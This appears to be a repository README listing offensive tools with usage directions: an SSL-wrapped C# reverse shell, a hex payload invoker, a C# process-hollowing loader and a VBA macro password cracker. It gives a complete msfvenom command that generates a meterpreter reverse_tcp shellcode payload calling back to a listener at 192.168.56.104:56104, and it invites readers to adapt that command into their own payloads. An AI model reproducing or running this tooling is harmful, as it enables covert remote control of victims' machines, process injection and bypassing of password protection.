# Rando
//SslReverseLib is a copy of Jamie Bowman's reverse shell implementation (Ref #1).
The only change I made was wrapping it inside of Microsoft's official SSLSTREAM class (Ref #2).
Programmer needs only to provide a base64 encoded PEM certificate (Ref #3) to get it working
1. https://www.mrjamiebowman.com/hacking/c-sharp-reverse-shell/
2. https://docs.microsoft.com/en-us/dotnet/api/system.net.security.sslstream
3. https://nmap.org/ncat/guide/ncat-ssl.html

//HexecutableInvoker executes any hexecutable payload provided. 
It was inspired by a SANS article on malicious JavaScript (Ref #1) as well Reversing Hub's exquisite class on hexecutable malware. Reccomend highly!!! (Ref #2).
The programmer needs only to replace the namespace & class with that of their payload & then provide the necessary arguments. Convert your payload to .hex format using the instructions provided in ReversingHub's Udemy course linked below.
1. https://isc.sans.edu/forums/diary/Malicious+Script+With+Multiple+Payloads/25090/
2. https://www.udemy.com/course/reverse-engineering-deep-dive/

//C# Process Hollowing
Gmgorelik's C# Process Hollowing implementation (Ref #1). The shell code being executed was generated using the following msfvenom command:
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=56104 -b "\x00" -f cs HollowP.xs
It calls out to a meterpreter listener on 192[.]168[.]56[.]104:56104. You may modify the above command to generate your own payload all the same. This program is mostly commodity & highly detectable.
1. https://gist.github.com/smgorelik/9a80565d44178771abf1e4da4e2a0e75
2. https://www.offensive-security.com/metasploit-unleashed/msfvenom/

//VBA Macro Hacker
Originally derived from the below StackOverflow page (Ref #1) this .csv contains a function to unlock any VBA macro past password protection.
Open the MacroHacker.csv along side your favorite password protected macro & then execute the unlock funtion.
This should make the previously locked macro viewable in Excel's VBA editor.
1. https://stackoverflow.com/questions/1026483/is-there-a-way-to-crack-the-password-on-an-excel-vba-project
